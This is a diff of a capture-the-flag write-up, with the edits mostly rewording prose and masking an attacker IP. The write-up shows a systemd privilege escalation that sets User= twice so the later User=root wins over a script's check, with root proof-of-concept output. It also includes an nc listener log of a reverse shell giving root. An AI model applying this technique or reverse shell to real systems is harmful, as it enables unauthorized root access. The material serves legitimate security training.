@@ -85,7 +85,7 @@ Group=f_omm_app
 User=root
 ```
 
-Turns out, when a field is set *twice* it is the *latest* occurrence of the field that takes precedence. Thus, we can bypass the if-check in the `appsysctladd` script by including `User=f_omm_app`, but then set `User=root` afterwards to make the service execute as root.
+Turns out, when a field is set *twice* it is the *latest* occurrence of the field that takes precedence. Thus, we can bypass the if-check in the `appsysctladd` script by including `User=f_omm_app` (because we have to), and then afterwards set `User=root` to make the service execute as root.
 ```
 f_omm_app@ip-10-128-3-164:/dev/shm$ cat ip-10-128-3-164/test.service
 [Service]
@@ -106,7 +106,7 @@ f_omm_app@ip-10-128-3-164:/dev/shm$ cat /tmp/output
 uid=0(root) gid=1003(f_omm_app) groups=1003(f_omm_app)
 ```
 
-With this knowledge, we can swap out the `ExecStart` POC with a reverse shell to get root, and the flag!
+As we can see, the service runs as `root` now. With this knowledge, we can swap out the `ExecStart` POC with a reverse shell to become root, and then get the flag!
 ```
 f_omm_app@ip-10-128-3-164:/dev/shm$ cat ip-10-128-3-164/test.service
 [Service]
@@ -126,7 +126,7 @@ appsysctladd: Setting up systemd service from /dev/shm/ip-10-128-3-164/test.serv
 ```
 $ nc -lnvp 9001
 listening on [any] 9001 ...
-connect to [10.128.1.12] from (UNKNOWN) [10.128.3.164] 54920
+connect to [<attacker_ip>] from (UNKNOWN) [10.128.3.164] 54920
 sh: 0: can't access tty; job control turned off
 # id
 uid=0(root) gid=1003(f_omm_app) groups=1003(f_omm_app)
